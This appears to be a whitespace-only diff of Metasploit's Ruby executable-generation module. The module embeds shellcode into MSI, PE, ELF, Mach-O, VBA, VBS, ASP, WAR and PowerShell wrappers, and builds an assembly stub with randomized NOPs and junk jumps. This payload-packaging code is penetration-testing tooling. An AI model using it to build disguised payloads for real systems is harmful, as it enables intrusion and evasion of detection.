@@ -622,63 +622,63 @@ require 'digest/sha1'
     return pe
   end
 
-	#
-	#   Wraps an executable inside a Windows
-	#    .msi file for auto execution when run
-	#
-	def self.to_exe_msi(framework, exe, opts={})
-		opts[:msi_template] ||= "template_windows.msi"
-		return replace_msi_buffer(exe, opts)
-	end
+  #
+  #   Wraps an executable inside a Windows
+  #    .msi file for auto execution when run
+  #
+  def self.to_exe_msi(framework, exe, opts={})
+    opts[:msi_template] ||= "template_windows.msi"
+    return replace_msi_buffer(exe, opts)
+  end
 
-	def self.replace_msi_buffer(pe, opts)
-		opts[:msi_template_path] ||= File.join(File.dirname(__FILE__), "..", "..", "..", "data", "templates")
+  def self.replace_msi_buffer(pe, opts)
+    opts[:msi_template_path] ||= File.join(File.dirname(__FILE__), "..", "..", "..", "data", "templates")
 
-		if opts[:msi_template].include?(File::SEPARATOR)
-			template = opts[:msi_template]
-		else
-			template = File.join(opts[:msi_template_path], opts[:msi_template])
-		end
+    if opts[:msi_template].include?(File::SEPARATOR)
+      template = opts[:msi_template]
+    else
+      template = File.join(opts[:msi_template_path], opts[:msi_template])
+    end
 
-		msi = ''
-		File.open(template, "rb") { |fd|
-			msi = fd.read(fd.stat.size)
-		}
+    msi = ''
+    File.open(template, "rb") { |fd|
+      msi = fd.read(fd.stat.size)
+    }
 
-		section_size =	2**(msi[30..31].unpack('s')[0])
-		sector_allocation_table = msi[section_size..section_size*2].unpack('l*')
+    section_size =	2**(msi[30..31].unpack('s')[0])
+    sector_allocation_table = msi[section_size..section_size*2].unpack('l*')
 
-		buffer_chain = []
-		current_secid = 5	# This is closely coupled with the template provided and ideally
-					# would be calculated from the dir stream?
+    buffer_chain = []
+    current_secid = 5	# This is closely coupled with the template provided and ideally
+          # would be calculated from the dir stream?
 
-		until current_secid == -2
-			buffer_chain << current_secid
-			current_secid = sector_allocation_table[current_secid]
-		end
+    until current_secid == -2
+      buffer_chain << current_secid
+      current_secid = sector_allocation_table[current_secid]
+    end
 
-		buffer_size = buffer_chain.length * section_size
+    buffer_size = buffer_chain.length * section_size
 
-		if pe.size > buffer_size
-			raise RuntimeError, "MSI Buffer is not large enough to hold the PE file"
-		end
+    if pe.size > buffer_size
+      raise RuntimeError, "MSI Buffer is not large enough to hold the PE file"
+    end
 
-		pe_block_start = 0
-		pe_block_end = pe_block_start + section_size - 1
+    pe_block_start = 0
+    pe_block_end = pe_block_start + section_size - 1
 
-		buffer_chain.each do |section|
-			block_start = section_size * (section + 1)
-			block_end = block_start + section_size - 1
-			pe_block = [pe[pe_block_start..pe_block_end]].pack("a#{section_size}")
-			msi[block_start..block_end] = pe_block
-			pe_block_start = pe_block_end + 1
-			pe_block_end += section_size
-		end
+    buffer_chain.each do |section|
+      block_start = section_size * (section + 1)
+      block_end = block_start + section_size - 1
+      pe_block = [pe[pe_block_start..pe_block_end]].pack("a#{section_size}")
+      msi[block_start..block_end] = pe_block
+      pe_block_start = pe_block_end + 1
+      pe_block_end += section_size
+    end
 
-		return msi
-	end
+    return msi
+  end
 
-	def self.to_osx_arm_macho(framework, code, opts={})
+  def self.to_osx_arm_macho(framework, code, opts={})
 
     # Allow the user to specify their own template
     set_template_default(opts, "template_armle_darwin.bin")
@@ -1622,238 +1622,238 @@ def self.to_vba(framework,code,opts={})
       pop eax                ; Skip
       popad                  ; Get our registers back
 ;		  sub esp, 44             ; Move stack pointer back past the handler
-		^
+    ^
 
-		stub_final = %Q^
-		get_payload:
-		  call got_payload
-		payload:
-		; Append an arbitrary payload here
-		^
-
-
-		stub_alloc.gsub!('short', '')
-		stub_alloc.gsub!('byte', '')
-
-		wrapper = ""
-		# regs    = %W{eax ebx ecx edx esi edi ebp}
-
-		cnt_jmp = 0
-		cnt_nop = 64
-
-		stub_alloc.each_line do |line|
-			line.gsub!(/;.*/, '')
-			line.strip!
-			next if line.empty?
-
-			if (cnt_nop > 0 and rand(4) == 0)
-				wrapper << "nop\n"
-				cnt_nop -= 1
-			end
-
-			if(cnt_nop > 0 and rand(16) == 0)
-				cnt_nop -= 2
-				cnt_jmp += 1
-
-				wrapper << "jmp autojump#{cnt_jmp}\n"
-				1.upto(rand(8)+1) do
-					wrapper << "db 0x#{"%.2x" % rand(0x100)}\n"
-					cnt_nop -= 1
-				end
-				wrapper << "autojump#{cnt_jmp}:\n"
-			end
-			wrapper << line + "\n"
-		end
-
-		#someone who knows how to use metasm please explain the right way to do this.
-		wrapper << "db 0xe9\n db 0xFF\n db 0xFF\n db 0xFF\n db 0xFF\n"
-		wrapper << stub_final
-
-		enc = Metasm::Shellcode.assemble(Metasm::Ia32.new, wrapper).encoded
-		soff = enc.data.index("\xe9\xff\xff\xff\xff") + 1
-		res = enc.data + code
-
-		if which_offset == 'start'
-			res[soff,4] = [block_offset - (soff + 4)].pack('V')
-		elsif which_offset == 'end'
-			res[soff,4] = [res.length - (soff + 4) + block_offset].pack('V')
-		else
-			raise RuntimeError, 'Blast! Msf::Util::EXE.rwx_exec_thread called with invalid offset!'
-		end
-		res
-	end
+    stub_final = %Q^
+    get_payload:
+      call got_payload
+    payload:
+    ; Append an arbitrary payload here
+    ^
 
 
-	#
-	# Generate an executable of a given format suitable for running on the
-	# architecture/platform pair.
-	#
-	# This routine is shared between msfencode, rpc, and payload modules (use
-	# <payload>)
-	#
-	# @param framework [Framework]
-	# @param arch [String] Architecture for the target format; one of the ARCH_*
-	# constants
-	# @param plat [#index] platform
-	# @param code [String] The shellcode for the resulting executable to run
-	# @param fmt [String] One of the executable formats as defined in
-	#   {.to_executable_fmt_formats}
-	# @param exeopts [Hash] Passed directly to the approrpriate method for
-	#   generating an executable for the given +arch+/+plat+ pair.
-	# @return [String] An executable appropriate for the given
-	#   architecture/platform pair.
-	# @return [nil] If the format is unrecognized or the arch and plat don't
-	#   make sense together.
-	def self.to_executable_fmt(framework, arch, plat, code, fmt, exeopts)
-		# For backwards compatibility with the way this gets called when
-		# generating from Msf::Simple::Payload.generate_simple
-		if arch.kind_of? Array
-			output = nil
-			arch.each do |a|
-				output = to_executable_fmt(framework, a, plat, code, fmt, exeopts)
-				break if output
-			end
-			return output
-		end
+    stub_alloc.gsub!('short', '')
+    stub_alloc.gsub!('byte', '')
 
-		case fmt
-		when 'asp'
-			exe = to_executable_fmt(framework, arch, plat, code, 'exe', exeopts)
-			output = Msf::Util::EXE.to_exe_asp(exe, exeopts)
+    wrapper = ""
+    # regs    = %W{eax ebx ecx edx esi edi ebp}
 
-		when 'aspx'
-			exe = to_executable_fmt(framework, arch, plat, code, 'exe', exeopts)
-			output = Msf::Util::EXE.to_exe_aspx(exe, exeopts)
+    cnt_jmp = 0
+    cnt_nop = 64
 
-		when 'dll'
-			output = case arch
-				when ARCH_X86,nil then to_win32pe_dll(framework, code, exeopts)
-				when ARCH_X86_64  then to_win64pe_dll(framework, code, exeopts)
-				when ARCH_X64     then to_win64pe_dll(framework, code, exeopts)
-				end
-		when 'exe'
-			output = case arch
-				when ARCH_X86,nil then to_win32pe(framework, code, exeopts)
-				when ARCH_X86_64  then to_win64pe(framework, code, exeopts)
-				when ARCH_X64     then to_win64pe(framework, code, exeopts)
-				end
+    stub_alloc.each_line do |line|
+      line.gsub!(/;.*/, '')
+      line.strip!
+      next if line.empty?
 
-		when 'exe-service'
-			output = case arch
-				when ARCH_X86,nil then to_win32pe_service(framework, code, exeopts)
-				when ARCH_X86_64  then to_win64pe_service(framework, code, exeopts)
-				when ARCH_X64     then to_win64pe_service(framework, code, exeopts)
-			end
+      if (cnt_nop > 0 and rand(4) == 0)
+        wrapper << "nop\n"
+        cnt_nop -= 1
+      end
 
-		when 'exe-small'
-			output = case arch
-				when ARCH_X86,nil then to_win32pe_old(framework, code, exeopts)
-				end
+      if(cnt_nop > 0 and rand(16) == 0)
+        cnt_nop -= 2
+        cnt_jmp += 1
 
-		when 'exe-only'
-			output = case arch
-				when ARCH_X86,nil then to_winpe_only(framework, code, exeopts, arch)
-				when ARCH_X86_64  then to_winpe_only(framework, code, exeopts, arch)
-				when ARCH_X64     then to_winpe_only(framework, code, exeopts, arch)
-				end
+        wrapper << "jmp autojump#{cnt_jmp}\n"
+        1.upto(rand(8)+1) do
+          wrapper << "db 0x#{"%.2x" % rand(0x100)}\n"
+          cnt_nop -= 1
+        end
+        wrapper << "autojump#{cnt_jmp}:\n"
+      end
+      wrapper << line + "\n"
+    end
 
-		when 'msi'
-			case arch
-				when ARCH_X86,nil
-					exe = to_win32pe(framework, code, exeopts)
-				when ARCH_X86_64,ARCH_X64
-					exe = to_win64pe(framework, code, exeopts)
-			end
-			output = Msf::Util::EXE.to_exe_msi(framework, exe, exeopts)
+    #someone who knows how to use metasm please explain the right way to do this.
+    wrapper << "db 0xe9\n db 0xFF\n db 0xFF\n db 0xFF\n db 0xFF\n"
+    wrapper << stub_final
 
-		when 'elf'
-			if (not plat or (plat.index(Msf::Module::Platform::Linux)))
-				output = case arch
-					when ARCH_X86,nil then to_linux_x86_elf(framework, code, exeopts)
-					when ARCH_X86_64  then to_linux_x64_elf(framework, code, exeopts)
-					when ARCH_X64     then to_linux_x64_elf(framework, code, exeopts)
-					when ARCH_ARMLE   then to_linux_armle_elf(framework, code, exeopts)
-					when ARCH_MIPSBE  then to_linux_mipsbe_elf(framework, code, exeopts)
-					when ARCH_MIPSLE  then to_linux_mipsle_elf(framework, code, exeopts)
-					end
-			elsif(plat and (plat.index(Msf::Module::Platform::BSD)))
-				output = case arch
-					when ARCH_X86,nil then Msf::Util::EXE.to_bsd_x86_elf(framework, code, exeopts)
-					end
-			elsif(plat and (plat.index(Msf::Module::Platform::Solaris)))
-				output = case arch
-					when ARCH_X86,nil then to_solaris_x86_elf(framework, code, exeopts)
-					end
-			end
+    enc = Metasm::Shellcode.assemble(Metasm::Ia32.new, wrapper).encoded
+    soff = enc.data.index("\xe9\xff\xff\xff\xff") + 1
+    res = enc.data + code
 
-		when 'macho'
-			output = case arch
-				when ARCH_X86,nil then to_osx_x86_macho(framework, code, exeopts)
-				when ARCH_X86_64  then to_osx_x64_macho(framework, code, exeopts)
-				when ARCH_X64     then to_osx_x64_macho(framework, code, exeopts)
-				when ARCH_ARMLE   then to_osx_arm_macho(framework, code, exeopts)
-				when ARCH_PPC     then to_osx_ppc_macho(framework, code, exeopts)
-				end
+    if which_offset == 'start'
+      res[soff,4] = [block_offset - (soff + 4)].pack('V')
+    elsif which_offset == 'end'
+      res[soff,4] = [res.length - (soff + 4) + block_offset].pack('V')
+    else
+      raise RuntimeError, 'Blast! Msf::Util::EXE.rwx_exec_thread called with invalid offset!'
+    end
+    res
+  end
 
-		when 'vba'
-			output = Msf::Util::EXE.to_vba(framework, code, exeopts)
 
-		when 'vba-exe'
-			exe = to_executable_fmt(framework, arch, plat, code, 'exe', exeopts)
-			output = Msf::Util::EXE.to_exe_vba(exe)
+  #
+  # Generate an executable of a given format suitable for running on the
+  # architecture/platform pair.
+  #
+  # This routine is shared between msfencode, rpc, and payload modules (use
+  # <payload>)
+  #
+  # @param framework [Framework]
+  # @param arch [String] Architecture for the target format; one of the ARCH_*
+  # constants
+  # @param plat [#index] platform
+  # @param code [String] The shellcode for the resulting executable to run
+  # @param fmt [String] One of the executable formats as defined in
+  #   {.to_executable_fmt_formats}
+  # @param exeopts [Hash] Passed directly to the approrpriate method for
+  #   generating an executable for the given +arch+/+plat+ pair.
+  # @return [String] An executable appropriate for the given
+  #   architecture/platform pair.
+  # @return [nil] If the format is unrecognized or the arch and plat don't
+  #   make sense together.
+  def self.to_executable_fmt(framework, arch, plat, code, fmt, exeopts)
+    # For backwards compatibility with the way this gets called when
+    # generating from Msf::Simple::Payload.generate_simple
+    if arch.kind_of? Array
+      output = nil
+      arch.each do |a|
+        output = to_executable_fmt(framework, a, plat, code, fmt, exeopts)
+        break if output
+      end
+      return output
+    end
 
-		when 'vbs'
-			exe = to_executable_fmt(framework, arch, plat, code, 'exe', exeopts)
-			output = Msf::Util::EXE.to_exe_vbs(exe, exeopts.merge({ :persist => false }))
+    case fmt
+    when 'asp'
+      exe = to_executable_fmt(framework, arch, plat, code, 'exe', exeopts)
+      output = Msf::Util::EXE.to_exe_asp(exe, exeopts)
 
-		when 'loop-vbs'
-			exe = exe = to_executable_fmt(framework, arch, plat, code, 'exe', exeopts)
-			output = Msf::Util::EXE.to_exe_vbs(exe, exeopts.merge({ :persist => true }))
+    when 'aspx'
+      exe = to_executable_fmt(framework, arch, plat, code, 'exe', exeopts)
+      output = Msf::Util::EXE.to_exe_aspx(exe, exeopts)
 
-		when 'war'
-			arch ||= [ ARCH_X86 ]
-			tmp_plat = plat.platforms if plat
-			tmp_plat ||= Msf::Module::PlatformList.transform('win')
-			exe = Msf::Util::EXE.to_executable(framework, arch, tmp_plat, code, exeopts)
-			output = Msf::Util::EXE.to_jsp_war(exe)
+    when 'dll'
+      output = case arch
+        when ARCH_X86,nil then to_win32pe_dll(framework, code, exeopts)
+        when ARCH_X86_64  then to_win64pe_dll(framework, code, exeopts)
+        when ARCH_X64     then to_win64pe_dll(framework, code, exeopts)
+        end
+    when 'exe'
+      output = case arch
+        when ARCH_X86,nil then to_win32pe(framework, code, exeopts)
+        when ARCH_X86_64  then to_win64pe(framework, code, exeopts)
+        when ARCH_X64     then to_win64pe(framework, code, exeopts)
+        end
 
-		when 'psh'
-			output = Msf::Util::EXE.to_win32pe_psh(framework, code, exeopts)
+    when 'exe-service'
+      output = case arch
+        when ARCH_X86,nil then to_win32pe_service(framework, code, exeopts)
+        when ARCH_X86_64  then to_win64pe_service(framework, code, exeopts)
+        when ARCH_X64     then to_win64pe_service(framework, code, exeopts)
+      end
 
-		when 'psh-net'
-			output = Msf::Util::EXE.to_win32pe_psh_net(framework, code, exeopts)
+    when 'exe-small'
+      output = case arch
+        when ARCH_X86,nil then to_win32pe_old(framework, code, exeopts)
+        end
 
-		end
+    when 'exe-only'
+      output = case arch
+        when ARCH_X86,nil then to_winpe_only(framework, code, exeopts, arch)
+        when ARCH_X86_64  then to_winpe_only(framework, code, exeopts, arch)
+        when ARCH_X64     then to_winpe_only(framework, code, exeopts, arch)
+        end
 
-		output
-	end
+    when 'msi'
+      case arch
+        when ARCH_X86,nil
+          exe = to_win32pe(framework, code, exeopts)
+        when ARCH_X86_64,ARCH_X64
+          exe = to_win64pe(framework, code, exeopts)
+      end
+      output = Msf::Util::EXE.to_exe_msi(framework, exe, exeopts)
 
-	def self.to_executable_fmt_formats
-		[
-			'dll','exe','exe-service','exe-small','exe-only','elf','macho','vba','vba-exe',
-			'vbs','loop-vbs','asp','aspx','war','psh','psh-net','msi'
-		]
-	end
+    when 'elf'
+      if (not plat or (plat.index(Msf::Module::Platform::Linux)))
+        output = case arch
+          when ARCH_X86,nil then to_linux_x86_elf(framework, code, exeopts)
+          when ARCH_X86_64  then to_linux_x64_elf(framework, code, exeopts)
+          when ARCH_X64     then to_linux_x64_elf(framework, code, exeopts)
+          when ARCH_ARMLE   then to_linux_armle_elf(framework, code, exeopts)
+          when ARCH_MIPSBE  then to_linux_mipsbe_elf(framework, code, exeopts)
+          when ARCH_MIPSLE  then to_linux_mipsle_elf(framework, code, exeopts)
+          end
+      elsif(plat and (plat.index(Msf::Module::Platform::BSD)))
+        output = case arch
+          when ARCH_X86,nil then Msf::Util::EXE.to_bsd_x86_elf(framework, code, exeopts)
+          end
+      elsif(plat and (plat.index(Msf::Module::Platform::Solaris)))
+        output = case arch
+          when ARCH_X86,nil then to_solaris_x86_elf(framework, code, exeopts)
+          end
+      end
 
-	#
-	# EICAR Canary: https://www.metasploit.com/redmine/projects/framework/wiki/EICAR
-	#
-	def self.is_eicar_corrupted?
-		path = ::File.expand_path(::File.join(::File.dirname(__FILE__), "..", "..", "..", "data", "eicar.com"))
-		return true if not ::File.exists?(path)
+    when 'macho'
+      output = case arch
+        when ARCH_X86,nil then to_osx_x86_macho(framework, code, exeopts)
+        when ARCH_X86_64  then to_osx_x64_macho(framework, code, exeopts)
+        when ARCH_X64     then to_osx_x64_macho(framework, code, exeopts)
+        when ARCH_ARMLE   then to_osx_arm_macho(framework, code, exeopts)
+        when ARCH_PPC     then to_osx_ppc_macho(framework, code, exeopts)
+        end
 
-		begin
-			data = ::File.read(path)
-			if Digest::SHA1.hexdigest(data) != "3395856ce81f2b7382dee72602f798b642f14140"
-				return true
-			end
+    when 'vba'
+      output = Msf::Util::EXE.to_vba(framework, code, exeopts)
 
-		rescue ::Exception
-			return true
-		end
+    when 'vba-exe'
+      exe = to_executable_fmt(framework, arch, plat, code, 'exe', exeopts)
+      output = Msf::Util::EXE.to_exe_vba(exe)
 
-		false
-	end
+    when 'vbs'
+      exe = to_executable_fmt(framework, arch, plat, code, 'exe', exeopts)
+      output = Msf::Util::EXE.to_exe_vbs(exe, exeopts.merge({ :persist => false }))
+
+    when 'loop-vbs'
+      exe = exe = to_executable_fmt(framework, arch, plat, code, 'exe', exeopts)
+      output = Msf::Util::EXE.to_exe_vbs(exe, exeopts.merge({ :persist => true }))
+
+    when 'war'
+      arch ||= [ ARCH_X86 ]
+      tmp_plat = plat.platforms if plat
+      tmp_plat ||= Msf::Module::PlatformList.transform('win')
+      exe = Msf::Util::EXE.to_executable(framework, arch, tmp_plat, code, exeopts)
+      output = Msf::Util::EXE.to_jsp_war(exe)
+
+    when 'psh'
+      output = Msf::Util::EXE.to_win32pe_psh(framework, code, exeopts)
+
+    when 'psh-net'
+      output = Msf::Util::EXE.to_win32pe_psh_net(framework, code, exeopts)
+
+    end
+
+    output
+  end
+
+  def self.to_executable_fmt_formats
+    [
+      'dll','exe','exe-service','exe-small','exe-only','elf','macho','vba','vba-exe',
+      'vbs','loop-vbs','asp','aspx','war','psh','psh-net','msi'
+    ]
+  end
+
+  #
+  # EICAR Canary: https://www.metasploit.com/redmine/projects/framework/wiki/EICAR
+  #
+  def self.is_eicar_corrupted?
+    path = ::File.expand_path(::File.join(::File.dirname(__FILE__), "..", "..", "..", "data", "eicar.com"))
+    return true if not ::File.exists?(path)
+
+    begin
+      data = ::File.read(path)
+      if Digest::SHA1.hexdigest(data) != "3395856ce81f2b7382dee72602f798b642f14140"
+        return true
+      end
+
+    rescue ::Exception
+      return true
+    end
+
+    false
+  end
 
 end
 end
